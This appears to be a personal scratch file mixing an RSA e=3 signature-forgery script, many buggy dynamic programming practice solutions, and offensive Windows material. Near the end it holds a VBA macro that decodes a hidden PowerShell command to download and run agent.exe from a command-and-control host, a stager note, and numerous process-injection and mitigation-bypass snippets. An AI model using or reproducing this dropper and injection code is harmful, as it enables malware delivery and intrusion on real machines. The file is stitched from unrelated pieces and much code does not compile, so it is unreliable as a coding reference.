        filler_len = total_len - len(target_prefix)
        filler_bytes = random_helper.random_bytes(filler_len)
        sign_target = target_prefix + filler_bytes
        forged = roots.iroot(int.from_bytes(sign_target, "big"), 3)
        suffix_int = int.from_bytes(suffix, "big")
        forged = bitops.replace_suffix(forged, suffix_int,
                                       suffix_len=len(suffix) * 8)
        cube_bytes = (forged**3).to_bytes(total_len, "big")
        if not cube_bytes.startswith(target_prefix):
            # This is unlikely, but if fixing our own suffix changes the upper
            # bytes post-cubing such that it changes the prefix, the filler
            # bytes don't really work for our suffix. We just try again.
            continue
        assert cube_bytes.startswith(target_prefix)  # I think this can happen normally
        padding_start = len(target_prefix)
        padding = cube_bytes[padding_start:padding_start + padding_len]
        if (forbidden_padding_byte is None or
            forbidden_padding_byte not in padding):
            break  # No forbidden bytes in padding, or none were forbidden.
    print()
    if forbidden_padding_byte is not None:
        print("    Found prefix that generates no forbidden padding bytes!")
    return byteops.int_to_bytes(forged)



print("[*] Generating 1024-bit key...")
r = rsa.Rsa(e=3, bits=1024)
print("[*] Signing and testing validation logic...")
hello_world_sign = sign(r, b"hello world!", bits=1024)
assert validate_prefix_match(r, b"hello world!", hello_world_sign, bits=1024)
assert validate_prefix_suffix(r, b"hello world!", hello_world_sign, bits=1024)
assert not validate_prefix_match(r, b"hi mom", hello_world_sign, bits=1024)
assert not validate_prefix_suffix(r, b"hi mom", hello_world_sign, bits=1024)

print("[*] Forging signature that fools logic that only checks prefix...")
target_hash = hashlib.sha1(b"hi mom").digest()
forge_target = pkcs1_v1_5.encode(pkcs1_v1_5.sha1_digest_info(target_hash),
                                 total_len=1024//8)
# target looks like 0001ffffff...ffff00<digest_info>. We'll remove a bunch of
# 'ff's to leave some space for our imperfect cube root.
# We "shift" digest_info left by quite a bit to make sure that we can find a
# cube root.
strip_len = 85
assert forge_target[3:3+strip_len] == b"\xff" * strip_len
# Filling in with FFs since iroot is giving us floor(cube_root(n)), leaves us
# more numerical space to find a root that has our desired prefix.
forge_target = (forge_target[:3] +
                forge_target[3+strip_len:] +
                b"\xff" * strip_len)
forged_signature = roots.iroot(int.from_bytes(forge_target, "big"), 3)
assert validate_prefix_match(r, b"hi mom", forged_signature, bits=1024)

print("[*] Forging signature for the same validator, crafting it 'by hand'...")
# See https://mailarchive.ietf.org/arch/msg/openpgp/5rnE9ZRN1AokBVj3VqblGlP63QE/
# Let's work with a 3072-bit key (more space to find a root).
# Size of 00<digest_info> for SHA-1 is 36 bytes (288 bits).
# We'll be producing 00 01 FF ... FF 00 <digest_info> <garbage>.
# Reminder that (A-B)^3 = A^3 - 3(A^2)B + 3A(B^2) - B^3.
# So if we can formulate our target as something that looks like that, we can
# just use (A-B) as our forged signature.
# Following Bleichenbacher's notes, we define:
# D := 00 <digest_info>
# N := 2^288 - D  (note 288 comes from size in bits of <digest_info>)
# We assume that N = 0 (mod 3).
# We choose to place D 2072 bits over from the right (numerically, D * 2^2072).
# Our padded version will look like:
# 00 01 FF ... FF <D> <GARBAGE>

# Prefix:
# If we want to only represent the prefix 00 01 FF ... FF (followed by zeros
# since it's just the prefix) numerically, you can do:
# 2^(3072 - 15) - 2^(2072 + 288) = 2^3057 - 2^2360
# '15' is the number of 0 bits in 00 01
# '2072 + 288' is the number of bits for <D> <GARBAGE>
# By doing one minus the other, we get the numerical value for having a series
# of 1s in the positions where we have 01 FF ... FF.

# Numerically:
# Our padded numerical value is thus:
# 2^3057 - 2^2360 + D*2^2072 + garbage
# This can be rewritten as:
# 2^3057 - N*2^2072 + garbage
# The cube root of this is then 2^1019 - (N*2^34/3)

# If we cube it:
# (2^1019 - (N * 2^34 / 3))^3  (note this is of the form (A-B)^3)
# Reminder that (A-B)^3 = A^3 - 3(A^2)B + 3A(B^2) - B^3.
# = (2^1019)^3 - 3*(2^1019)^2*(N*2^34/3) + 3*2^1019*(N*2^34/3)^2 - (N*2^34/3)^3
# = 2^3057 - (3*2^2038*N*2^34/3) + (3*2^1019*N^2*2^68/9) - (N^3*2^102/27)
# = 2^3057 - N*2^2072 + N^2*2^1087/3 - N^3*2^102/27
# This fits the pattern:
# 2^3057 - N*2^2072 + garbage
# So it works!
print("[*] Generating 3072-bit key...")
r = rsa.Rsa(e=3, bits=3072)
D = b"\x00" + pkcs1_v1_5.sha1_digest_info(target_hash).encode()
D = int.from_bytes(D, "big")
N = (1 << 288) - D
assert N % 3 == 0
forged_signature = (1 << 1019) - (N * (1 << 34) // 3)
assert validate_prefix_match(r, b"hi mom", forged_signature, bits=3072)

# What if we had an implementation that verified that ASN.1 parsing had no
# leftover, but didn't check that the padding was 'ff's?
# https://blog.filippo.io/bleichenbacher-06-signature-forgery-in-python-rsa/
# This is CVE-2016-1494 (python-rsa), where the implementation functionally
# extracted the ASN.1 blob with the regex \x00\x01[^\x00]*\x00(.*)
print("[*] Forging signature for a validator that checks prefix/suffix...")
# First, our previous forged signature would fail, since it has leftover data
# from ASN.1 parsing (i.e. not right-aligned):
print("    Check that our previous signature would fail here:")
assert not validate_prefix_suffix(r, b"hi mom", forged_signature, bits=3072)
# See comment later for why we're crafting a slightly different message.
target_hash = hashlib.sha1(b"hi mom\x00\x00").digest()
target_suffix = b"\x00" + pkcs1_v1_5.sha1_digest_info(target_hash).encode()
# We can generate the suffix by solving 'suffix = x^3 (mod 2^bitlen(suffix))'.
print("    Crafting suffix...")
xs = roots.solve_pow_with_suffix(target_suffix, n=3)
# Note: turns out "hi mom" doesn't work here (no 'x' possible). This is why we
# are crafting a signature for a slightly different message, which in practice
# would have a similar effect.
assert xs, "No 'x' s.t. x^3 ends with %s. Choose another msg!" % target_suffix
suffix = min(xs)
assert (suffix**3).to_bytes(3072//8, "big").endswith(target_suffix)
suffix_bytes = byteops.int_to_bytes(suffix)

# We can generate a target prefix via integer cube-root.
target_prefix = b"\x00\x01\xff"
total_len = 3072//8
padding_len = total_len - len(target_prefix) - len(target_suffix)
prefix_bytes = _forge_cubed_prefix(target_prefix, total_len, padding_len,
                                   suffix_bytes, forbidden_padding_byte=b"\x00")

print("    Forging final signature...")
forged = prefix_bytes[:-len(suffix_bytes)] + suffix_bytes
print("    Signature: %s" % forged.hex())
forged = int.from_bytes(forged, "big")
print("    Produces:  %s" % (forged**3).to_bytes(3072//8, "big").hex())
assert (forged**3).to_bytes(3072//8, "big").startswith(b"\x00\x01\xff")
assert (forged**3).to_bytes(3072//8, "big").endswith(target_suffix)
assert validate_prefix_suffix(r, b"hi mom\x00\x00", forged, bits=3072)

-------------------------------------------------------------------------------------------------
challenge 43
---------------------
didnt 
----------------------------------------------------------------------------


OK Bye Today 
--------------------



-----------------------------------------------------------------------------------------------------------------------------------------------------
ROS continued 
--------------------
-----------------------------------------------------------------------------


Baloon Bursting Problem 
-------------------------------

public class BurstBalloons 
{
private int[][] dp;
private int[] N ;
 
 
 public static void main(String[] args throws Exception)
 {
 int[] A = {3,1,5,8};
 System.out.println(new BurstBalloons().maxCoins(A));
 }
 
 public int maxCoins(int[] nums)
 {
 N  = new int[nums.length + 2];
 N[0] = N[N.length - 1] = 1;
 for (int i = 0; i < nums.length; i++)
 {
 N[i+1] = nums[i];
 
 }
 
 int[][] DP = new int[N.length][N.length];
 for(int r =2; r < N.length;r++)
 {
 for(int i=0 ; i  <N.length; i++)
 {
 int j = i  +r;
 if (j  < N.length)
 {
 int max = Integer.MIN_VALUE;
 for(int t = i + 1; t < j;  t++)
 {
 max = Math.max(max, N[t] * N[i] *N[j] + DP[t][j] + DP[i][t]);
 
 }
 DP[i][j] = max;
 
 }
 }
 }
 return DP[0][N.length - 1];
 
 
 }
}


-------------------------------------------------------------------------------------------------------------
HouseRobber
-----------------

import java.util.Arrays;

public class Houserobber{
public static void main(String[] args throws Exception)
{
int[] nums = {6,3,10,8,2,10,3,5,10,5,3};
System.out.println(new HouseRobber().rob(nums));

}

public int rob(int[]nums){
if (nums.length == 0)return 0;
if(nums.length == 1)return nums[0];
else if (nums.length == 2){

if (nums[0]  >nums[1]) return nums[0];
return nums[1];

}else if 
(nums.length == 3)
return Math.max(Math.max(nums[0], nums[1]),nums[2]);
int[] DP = new int[nums.length];
for (int i = nums.length -1,i > 0;i--){
if (i  +3 < nums.length)
DP[i] = Math.max(nums[i]  +DP[i+2], nums[i] + DP[i  +3]);
else if (i  +2 < nums.length)
DP[i] = nums[i] + DP[i + 2];
else DP[i] = nums[i];

}


itn max = Math.max(DP[1],DP[2]);
Arrays.fill(DP,0);
for (int i = nums.length - 2; i >= 2;i--)
{
if (i  +3  < nums.length)DP[i] = Math.max(nums[i] + DP[i+2], nums[i] + DP[i + 3]);
else if (i  +2 < nums.length)
DP [i] = nums[i]  +DP[i + 2];
else DP[i] = nums[i];
 
}
MAX = Math.max(max, Math.max(DP[0,DP[1]]));
return max;


}
}

-----------------------------------------------------------------------------------------------------------------------------

Unique Binary Tree
----------------------------
public class UniqueBinarySearchTree {
int[] dp;

public static void main(String[] args) throws Exception{
System.out.println(new UniqueBinarySearchTree().numTrees(5));


}

public int numTrees(int n)
{
dp = new int[n+1];
dp[0] = 1;
return dp(n);

}

private int dp(int n)
{
if(dp[n] != 0) return dp[n];
for (int i = 1; i <=n; i++)
{
dp[n] += dp(n-i) * dp(n-(n-i)-1);

}
return dp[n];

}
}

---------------------------------------------------------------------------------------------------------------------------------------


Smallest Sufficientteam 
------------------------------------


public class SmallestSufficientTeam{
public static void main(String[] args)
{
String[] req = {"java","nodejs","reactjs"};
List<List<String>> people = new ArrayList<>();
people.add(Arrays.asList("java"));
people.add(Arrays.asList("nodejs"));
people.add(Arrays.asList("nodejs","reactjs"));
int[] R = new SmallestSufficientTeam().smallestSufficientTeam(req, people);
for (int r : R) {
System.out.print(r + " ");

}
System.out.prinln();

}
private int allSkills;
Map<Integer,Integer> peopleSkillSet;
Map<String,Integer> skillMap;
final int MAX_SKILS = 63;
final int CHOOSE_PEOPLE = 64;

public int[] smallestSufficientTeam(String[] reqskills, Lis<List<String>> people)
{
skillMap = new HashMap<>();
peopleSkillSet = new HashMap<>();
int i = 0;

for (String s : reqSkills)
{
skillMap.put(s,i++);

}

for(int i =0; i < people.size(); i++)
{
for (String s : people.get(i))
{
int skillIndecx = skillMap.get(s);
int skills  = peopleSkillSet.getOrDefault(i,0);
skills = (skills | (1 << skillIndex));
peopleSkillSet.put(i, skills);

}
}

int S = ((int) (Math.pow(2, reqSkills.length)) + 1);
    int[][] DP = new int[S][people.size()];
    allSkills = (1 << reqSkills.length) - 1;
    for (i = 0; i < DP.length; i++) {
      for (int j = 0; j < DP[0].length; j++) {
        DP[i][j] = -1;
      }
    }
    int n = dp(0, 0, DP);
    n &= MAX_SKILLS;
    if (n == Integer.MAX_VALUE) return new int[0];
    List<Integer> answer = new ArrayList<>();
    i = 0;
    for (int j = 0; j < people.size(); j++) {
      if (((DP[i][j] & MAX_SKILLS) == n) && (DP[i][j] & CHOOSE_PEOPLE) > 0) {
        i |= (peopleSkillSet.getOrDefault(j, 0));
        answer.add(j);
        n--;
      }
      if (n == 0) break;
    }
    int[] result = new int[answer.size()];
    for (int a = 0; a < result.length; a++) {
      result[a] = answer.get(a);
    }
    return result;
  }

  private int dp(int i, int skill, int[][] DP) {
    if (i >= DP[0].length) {
      if (skill >= allSkills) {
        return 0;
      } else return Integer.MAX_VALUE;
    }
    if (skill == allSkills) return 0;
    else if (DP[skill][i] != -1) return DP[skill][i];
    else {
      int withOut = dp(i + 1, skill, DP);
      int with = dp(i + 1, (skill | peopleSkillSet.getOrDefault(i, 0)), DP);
      with += with != Integer.MAX_VALUE ? 1 : 0;
      if (Math.min(with, withOut) == Integer.MAX_VALUE) {
        DP[skill][i] = Integer.MAX_VALUE;
      } else
        DP[skill][i] =
            ((with & MAX_SKILLS) < (withOut & MAX_SKILLS))
                ? ((with & MAX_SKILLS) | CHOOSE_PEOPLE)
                : (withOut & MAX_SKILLS);
      return DP[skill][i];
    }
	
	

}
}

---------------------------------------------------------------------------------------------------------------------------------
Find an element in array such that sum of left array is equal to sum of right array

------------------------------------------------------------------------------------


using namespace std;
int findelement(int arr[], int n)
{
int prefixSum[n];
prefixSum[0] = arr[0];
for  (int i = 1; i < n; i ++)
{
prefixSum[i] = prefixSum[i-1] + arr[i];



int suffoxSum[n];
suffixSum[n-1] = arr[n-1];

for (int i = n-1; i>= 0;i--)
{
suffixSum[i] = suffixSum[i+1] + arr[i];

for(int i=1; i < n-1; i++)
{
if(prefixSum[i] == suffixSum[i])
return arr[i];

}
}
}



---------------------------------------------------------------------------------------------------------------
Longest Palindromic SubSequence 
-------------------------------------------


public class Solution
{
public static void main(String[] args) throws Exception 
{
System.out.println(new Solution().solution("bbab"));

}

public int solution(String s)
{
int[][] dp = new int[s.length() + 1][s.length + 1];
String sI   = new StringBuilder(s).reverse().toString();
for(int i = 1; l = s.length(); i <= 1; i++)

for(int j = 1; j < =1 ; j++)
{
dp[i][j] = (s.charAt(i-1) ) == (sI.charAt(j-1))
? dp[i-1][j-1] + 1
: Math.max(dp[i][j-1],dp[i-1][j-1]);


}
   return dp[s.length()][s.length()];
   
}
}

----------------------------------------------------------------------------------------------------------------------------------
public class LongestIncreasingSubsequence {
  /**
   * Main method
   *
   * @param args
   * @throws Exception
   */
  public static void main(String[] args) throws Exception {
    int[] nums = {9, 8, 7, 6};
    System.out.println(new LongestIncreasingSubsequence().lengthOfLIS(nums));
  }
  
  public int LenthofLIS(int[] nums)
  {
  if(nums.length == 0)
  {
  return 0;
  
  }
  
  int[] A = new int[nums.length];
  int max = integer.MIN_VALUE;
  for(int i =0 ; l = nums.length;i < l; i++)
  {
  int lis =1;
  for(int j = 0; j < i;j++)
  {
  if(nums[i] > nums[j]) 
  lis = Math.max(lis, A[j] + 1);
  
  }
  A[i] = lis;
  max = Math.max(max,A[i]);
  
  }
  return max;
  
  }
  }
  
  
  -----------------------------------------------------------------------------------------------------------------------------\
  
  Minimum cost to tickets 
  ----------------------------------
  public class MinimumCostForTickets {

  public static void main(String[] args) {
    int[] days = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 30, 31};
    int[] costs = {2, 7, 15};
    System.out.println(new MinimumCostForTickets().mincostTickets(days, costs));
  }
  
  public int mincostTickets(int[] days, int[] costs)
  {
  
  
  int[] min = new int[days.length];
  Arrays.fill(min, INTEGER.MAX_VALUE);
  for(int i = days.length -1; i  >=0 ;i--)
  {
  for(int j =0 ; j < costs.length;j++)
  {
  if(j == 0)
  {
  min[i] = Math.min(min[i],costs[j] + ((i  + 1 >= min.length) ? 0 : min[i + 1]));
  
  }else if (j == 1)
  {
  int c = 0;
 for(int k = i  +1; k < days.length; k++)
 {
 if (days[k] >= (days[i] + 7))
 c = min[k];
 break;
 
 }
  }
  
  min[i] = Math.min(min[i], costs[j] + c);
  
  }else{
  itn c = 0;
  for(int k = i + 1; k < days.length; k++)
  {
  if(days[k] >= (days[i] + 30))
  {
  c = min[k];
  break;
  
  }
  }
  min[i] = Math.min(min[i], costs[j] + c);
  
  }
  }
  }
  return min[0];
  
  
  }
  }
  
  
  
  ----------------------------------------------------------------------------------------------------------------
  
  Minimum number of Tapes 
  --------------------------------
  
  public class MinimumNumberOfTaps {
  public static void main(String[] args) {
    int[] A = {0, 1, 2, 0, 0, 1, 1, 0};
    System.out.println(new MinimumNumberOfTaps().minTaps(7, A));
  }
  
  
  int[] DP;
  
  public int minTaps(int n, int[] ranges)
  {
  DP = new int[n + 1];
  Arrays.fill(DP, -2);
  return dp(0,0,ranges,n);
   //u fill dp with - 2
   
  }
 

private int dp(int i, int prev, int[] R, int n) {
if( i > n )return 0;
else  if(DP[i] != -2) return DP[i];
else{
int min = Integer.MAX_VALUE;
int start = R[prev] > 0 ? prev : i;
for(int j = start; j < start + 100 && j <= n; j++)
{
if (j - R[j] < = prev){
int result = dp(j + R[j] + 1, j + R[j],R,n);
if(result >= 0)
min = Math.min(min,result  +1);

}
}
}

DP[i] = (min == Integer.MAX_VALUE ? -1  :min);
return DP[i];

} 
  
  
  }
  
 }
 
 
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 stager payload 
 launcher.bat 
 
 
 stage encoder -noP -sta -w 1 -enc 
 
 
 STA  = Single threaded App 
 --------------------------------------------------------------------------------------------------------------
 
public class LengthofLongestFibonacciSubsequence {
  public static void main(String[] args) {
    int[] A = {1, 2, 4, 7, 12, 20};
    System.out.println(new LengthofLongestFibonacciSubsequence().lenLongestFibSubseq(A));
  }
  
  public int LenLongestFubSubSeq(int[] A)
{
if (A.length < 3 ) return 0;

Map<Integer, Map<Integer, Integer>> indexMap = new HashMap<>();
int max = 0;
for(int i = A.length - 1;i >= 0; i--)
{
Map<Integer, Integer> subHashMap = new HashMap<>();
for(int j = 0; j < i; j++)
{
int sum = A[i]  +A[j];
if(indexMap.containsKey(sum))
{
if(indexMap.get(sum).containsKey(A[i]))
{
int value = 1 + indexMap.get(sum).get(A[i]);
subHashMap.put(A[j], value);
max = Math.max(max, value);


}else{
subHashMap.put(A[i], 1);
max = Math.max(max, 1);

}
}
}
indexMap.put(A[i], subHashMap);

}
return max == 0?0:max + 2;


}  
  }
  
  
  -----------------------------------------------------------------------------------------------------------------------------------------------
  
  XOR Program
  -------------------------
  #include <iostream>
  using namespace std;
   int myXOR(int x, int y)
   {
   int res =0;
   for(int i= 31; i>=0; i--)
   {
   bool b1 = x & (1 << i);
   bool b2 = y & (1<< i);
   
   
   bool XOR  = (b1 & b2) ? 0 : (b1  |b2);
   res <<= 1;
   res |= XOR;
   
   }
   return res;
   
   }
   int main()
   {
   int x=3, y=5;
   cout<<"XOR is" << xor(x,y);
   return 0;
   
   }
   ---------------------------------------------------------------------------------------------------------------
   Option Explicit
Private Const clOneMask = 16515072
Private Const clTwoMask = 258048
Private Const clThreeMask = 4032
Private Const clFourMask = 63
Private Const clHighMask = 16711680
Private Const clMidMask = 65280
Private Const clLowMask = 255
Private Const cl2Exp18 = 262144
Private Const cl2Exp12 = 4096
Private Const cl2Exp6 = 64
Private Const cl2Exp8 = 256
Private Const cl2Exp16 = 65536
Public Function monkey(sString As String) As String
Dim bOut() As Byte, bIn() As Byte, bTrans(255) As Byte,
lPowers6(63) As Long, lPowers12(63) As Long
Dim lPowers18(63) As Long, lQuad As Long, iPad As Integer, lChar
As Long, lPos As Long, sOut As String
Dim lTemp As Long
sString = Replace(sString, vbCr, vbNullString)
sString = Replace(sString, vbLf, vbNullString)
lTemp = Len(sString) Mod 4
If InStrRev(sString, "==") Then
iPad = 2
ElseIf InStrRev(sString, "=") Then
iPad = 1
End If
For lTemp = 0 To 255
Select Case lTemp
Case 65 To 90
bTrans(lTemp) = lTemp - 65
Case 97 To 122
bTrans(lTemp) = lTemp - 71
Case 48 To 57
bTrans(lTemp) = lTemp + 4
Case 43
bTrans(lTemp) = 62
Case 47
bTrans(lTemp) = 63
End Select
Next lTemp
For lTemp = 0 To 63
lPowers6(lTemp) = lTemp * cl2Exp6
lPowers12(lTemp) = lTemp * cl2Exp12
lPowers18(lTemp) = lTemp * cl2Exp18
Next lTemp
bIn = StrConv(sString, vbFromUnicode)
ReDim bOut((((UBound(bIn) + 1) \ 4) * 3) - 1)
For lChar = 0 To UBound(bIn) Step 4
lQuad = lPowers18(bTrans(bIn(lChar))) +
lPowers12(bTrans(bIn(lChar + 1))) + _
lPowers6(bTrans(bIn(lChar + 2))) + bTrans(bIn(lChar +
3))
lTemp = lQuad And clHighMask
bOut(lPos) = lTemp \ cl2Exp16
lTemp = lQuad And clMidMask
bOut(lPos + 1) = lTemp \ cl2Exp8
bOut(lPos + 2) = lQuad And clLowMask
lPos = lPos + 3
Next lChar
sOut = StrConv(bOut, vbUnicode)
If iPad Then sOut = Left$(sOut, Len(sOut) - iPad)
monkey = sOut
End Function
Sub testb64()
'
' testb64 Macro
'
'
Dim PSResp As String
PSResp =
Shell(monkey("UG93ZXJTaGVsbCAoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCd
odHRwOi8vb3VyYzJzZXJ2ZXIuY29tL2Rvd25sb2FkL2MyYWdlbnQuZXhlJywnYWdlbnQuZXhlJyk7U3
RhcnQtUHJvY2VzcyAnYWdlbnQuZXhlJw=="), vbHide)
End Sub



   -----------------------------------------------------------------------------------------------
   
  Bypassing Windows prottection mechanism 
  ---------------------------------------------
  
  HANDLE p = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION, FALSE,
process_id);
MEMORY_BASIC_INFORMATION meminfo;
VirtualQueryEx(p, target, &meminfo, sizeof(meminfo));
CFG_CALL_TARGET_INFO cfg;
cfg.Offset = ((DWORD64)target) - (DWORD64)meminfo.AllocationBase;
cfg.Flags = CFG_CALL_TARGET_VALID;
SetProcessValidCallTargets(p, meminfo.AllocationBase, meminfo.RegionSize, 1,
&cfg);



HANDLE th=OpenThread(THREAD_SET_CONTEXT, FALSE, thread_id);
ntdll!NtQueueApcThread(th, SetProcessMitigationPolicy,
(void*)ProcessDynamicCodePolicy, ((char*)GetModuleHandleA("ntdll")) + 0x20,
sizeof(PROCESS_MITIGATION_DYNAMIC_CODE_POLICY));



HANDLE h = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE,
process_id);
LPVOID target_payload=VirtualAllocEx(h,NULL,sizeof(payload), MEM_COMMIT |
MEM_RESERVE, PAGE_EXECUTE_READWRITE); // Or any other memory allocation technique
WriteProcessMemory(h, target_payload, payload, sizeof(payload), NULL);



HANDLE h = OpenProcess(PROCESS_CREATE_THREAD, FALSE, process_id);
CreateRemoteThread(h, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA,
target_DLL_path, 0, NULL);


HANDLE h = OpenProcess(PROCESS_CREATE_THREAD, FALSE, process_id);
CreateRemoteThread(h, NULL, 0, (LPTHREAD_START_ROUTINE) target_execution, RCX, 0,
NULL);



HANDLE h = OpenThread(THREAD_SET_CONTEXT, FALSE, thread_id);
QueueUserAPC((LPTHREAD_START_ROUTINE)target_execution, h, RCX);
or

ntdll!NtQueueApcThread(h, (LPTHREAD_START_ROUTINE)target_execution, RCX, RDX, R8);

HANDLE t = OpenThread(THREAD_SET_CONTEXT, FALSE, thread_id);
SuspendThread(t);
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_CONTROL;
ctx.Rip = (DWORD64)target_execution;
SetThreadContext(t, &ctx);
ResumeThread(t);



HANDLE t = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, thread_id);
SuspendThread(t);
CONTEXT ctx;
ctx.Rip = GADGET_pivot; // pop rsp; ret
ctx.Rsp -= 8;
WriteProcessMemory(p, (LPVOID)ctx.Rsp, &new_stack_address, 8, NULL); // Or any
other memory write technique
//make sure stack is 16-byte aligned before the return address; make sure there’s
enough space *below* the entry point for stack used by system calls, etc.
SetThreadContext(t, &ctx);
ResumeThread(t);



void wait_until_done(HANDLE t, DWORD64 expected_rip_value)
{
CONTEXT x;
do
{
Sleep(10);
SuspendThread(t);
x.ContextFlags = CONTEXT_CONTROL;
GetThreadContext(t, &x);
ResumeThread(t);
} while (x.Rip != expected_rip_value);
}
DWORD64 GADGET_loop; // jmp -2
DWORD64 GADGET_pivot; // pop rsp; ret
HANDLE t = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, thread_id);
// Save the thread's state
SuspendThread(t);
CONTEXT old_ctx;
old_ctx.ContextFlags = CONTEXT_ALL;
GetThreadContext(t, &old_ctx);
// Hijack thread
CONTEXT new_ctx = old_ctx;
new_ctx.Rip = GADGET_pivot;
new_ctx.Rsp -= 8;
WriteProcessMemory(p, (LPVOID)new_ctx.Rsp, &new_stack_address, 8, NULL);
SetThreadContext(t, &new_ctx);
ResumeThread(t);
wait_until_done(t, GADGET_loop);
// Resume execution of original thread logic
SuspendThread(t);
SetThreadContext(t, &old_ctx);
ResumeThread(t);



HMODULE h = LoadLibraryA(dll_path);
HOOKPROC f = (HOOKPROC)GetProcAddress(h, "GetMsgProc"); // GetMessage hook
SetWindowsHookExA(WH_GETMESSAGE, f, h, thread_id);
PostThreadMessage(thread_id, WM_NULL, NULL, NULL);



void wait_until_done(HANDLE t, DWORD64 expected_rip_value)
{
CONTEXT x;
do
{
Sleep(10);
SuspendThread(t);
x.ContextFlags = CONTEXT_CONTROL;
GetThreadContext(t, &x);
ResumeThread(t);
}
while (x.Rip != expected_rip_value);
}
DWORD64 GADGET_loop; // jmp -2
DWORD64 GADGET_write; // mov [rdi],rbx; mov rbx, [rsp+0x60]; add rsp,0x50; pop
rdi; ret --- this is WRITE rbx at address rdi (and advance Rsp by 0x58…); note that in
Windows 10 version 1903, the gadget is changed to mov [rdi],rbx; mov rbx, [rsp+0x70];
add rsp,0x60; pop rdi; ret
HANDLE t = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, thread_id);
// Save target thread original state
SuspendThread(t);
CONTEXT old_ctx;
old_ctx.ContextFlags = CONTEXT_ALL;
GetThreadContext(t, &old_ctx);
// Prepare new stack in ROP_chain
DWORD64 new_stack_pos = ((old_ctx.Rsp - (sizeof(ROP_chain)+0x60) +8) &
0xFFFFFFFFFFFFFFF0) - 8 ; // make sure stack is 16-byte aligned before the return
address. Use 0x70 in version 1903.
// Write address of GADGET_loop to the target thread stack (used as part of the
Write Primitive)
CONTEXT new_ctx = old_ctx;
new_ctx.Rsp -= 8+0x58; // use 0x68 in version 1903
new_ctx.Rbx = GADGET_loop;
new_ctx.Rdi = new_ctx.Rsp+0x58; // use 0x68 in version 1903
new_ctx.Rip = GADGET_write;
SetThreadContext(t, &new_ctx);
ResumeThread(t);
wait_until_done(t, GADGET_loop);
// Write new stack to target process memory space
for (int i = 0; i < sizeof(ROP_chain)/sizeof(DWORD64); i++)
{
SuspendThread(t);
CONTEXT old_ctx;
old_ctx.ContextFlags = CONTEXT_ALL;
GetThreadContext(t, &old_ctx);
CONTEXT new_ctx = old_ctx;
new_ctx.Rsp -= 8+0x58; 
new_ctx.Rbx = ROP_chain[i];
new_ctx.Rdi = new_stack_pos + sizeof(DWORD64)*i;
new_ctx.Rip = GADGET_write;
SetThreadContext(t, &new_ctx);
ResumeThread(t);
wait_until_done(t, GADGET_loop);
}
// Execute code in target thread, moving RSP to new_stack_pos
new_ctx = old_ctx;
new_ctx.Rsp = new_stack_pos;
new_ctx.Rip = (DWORD64)execution_target;
SetThreadContext(t, &new_ctx);
ResumeThread(t);
wait_until_done(t, GADGET_loop);
// Resume original flow in target thread
SuspendThread(t);
SetThreadContext(t, &old_ctx);
ResumeThread(t);



HWND hWindow = FindWindowA("Shell_TrayWnd", NULL);
DWORD process_id;
GetWindowThreadProcessId(hWindow, &process_id);
// Using VirtualAllocEx+WriteProcessMemory to write payload and obj, but other
memory writing techniques are welcome
HANDLE h = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, false,
process_id);
DWORD64 obj[2];
LPVOID target_obj = VirtualAllocEx(h, NULL, sizeof(obj), MEM_COMMIT | MEM_RESERVE,
PAGE_READWRITE);
obj[0] = (DWORD64)target_obj + sizeof(DWORD64); //&(obj[1])
obj[1] = (DWORD64)target_execution;
WriteProcessMemory(h, target_obj, obj, sizeof(obj), NULL);
SetWindowLongPtrA(hWindow, 0, (DWORD64)target_obj);



HWND hWindow = FindWindowA("Shell_TrayWnd", NULL);
DWORD process_id;
GetWindowThreadProcessId(hWindow, &process_id);
DWORD64 old_obj = GetWindowLongPtrA(hWindow, 0);
HANDLE h = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, false,
process_id);
// Using VirtualAllocEx+WriteProcessMemory to write payload and obj, but other
memory writing techniques are welcome
LPVOID target_payload = VirtualAllocEx(h, NULL, sizeof(payload), MEM_COMMIT |
MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(h, target_payload, payload, sizeof(payload), NULL); // Make
sure payload sets eax=2 and rbx=old_obj before returning control. Also take care of stack
alignment if calling other functions
DWORD64 new_obj[2];
LPVOID target_obj = VirtualAllocEx(h, NULL, sizeof(new_obj), MEM_COMMIT |
MEM_RESERVE, PAGE_READWRITE);
new_obj[0] = (DWORD64)target_obj + sizeof(DWORD64); //&(new_obj[1])
new_obj[1] = (DWORD64)target_payload;
WriteProcessMemory(h, target_obj, obj, sizeof(new_obj), NULL);
SetWindowLongPtrA(hWindow, 0, (DWORD64)target_obj);
SendNotifyMessageA(hWindow, WM_PAINT, 0, 0);
Sleep(1);
SetWindowLongPtrA(hWindow, 0, old_obj);



HANDLE hm = OpenFileMapping(FILE_MAP_ALL_ACCESS,FALSE,section_name);
BYTE* buf = (BYTE*)MapViewOfFile(hm, FILE_MAP_ALL_ACCESS, 0, 0, section_size);
memcpy(buf+section_size-sizeof(payload), payload, sizeof(payload));
HANDLE h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE,
process_id);
char* read_buf = new char[sizeof(payload)];
SIZE_T region_size;
for (DWORD64 address = 0; address < 0x00007fffffff0000ull; address += region_size)
{
MEMORY_BASIC_INFORMATION mem;
SIZE_T buffer_size = VirtualQueryEx(h, (LPCVOID)address, &mem,
sizeof(mem));
if ((mem.Type == MEM_MAPPED) && (mem.State == MEM_COMMIT) && (mem.Protect
== PAGE_READWRITE) && (mem.RegionSize == section_size))
{
ReadProcessMemory(h, (LPCVOID)(address+section_sizesizeof(payload)), read_buf, sizeof(payload), NULL);
if (memcmp(read_buf, payload, sizeof(payload)) == 0)
{
// the payload is at address + section_size - sizeof(payload);
…
break;
}
}
region_size = mem.RegionSize;
}



HANDLE th = OpenThread(THREAD_SET_CONTEXT| THREAD_QUERY_INFORMATION, FALSE,
thread_id);
